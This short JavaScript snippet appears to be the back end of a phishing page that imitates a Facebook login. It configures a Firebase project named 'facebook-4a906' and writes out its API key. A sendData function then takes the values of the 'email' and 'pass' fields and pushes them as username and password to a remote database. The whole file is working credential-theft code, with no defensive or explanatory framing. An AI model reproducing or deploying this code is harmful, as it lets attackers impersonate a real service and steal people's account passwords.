var config = {
                            apiKey: "AIzaSyBHWNLzDMvzJj-IoMhvVyz-vSzehxhz-vE",
                            authDomain: "facebook-4a906.firebaseapp.com",
                            databaseURL: "https://facebook-4a906.firebaseio.com",
                            projectId: "facebook-4a906",
                            storageBucket: "facebook-4a906.appspot.com",
                            messagingSenderId: "786258521006"
                        };
            firebase.initializeApp(config);
            var db = firebase.database();
			var userDetails = db.ref('Facebook');

function sendData()
{
			var data = {
						username : $("email").value,
						password : $("pass").value
					}
			userDetails.push(data);
}
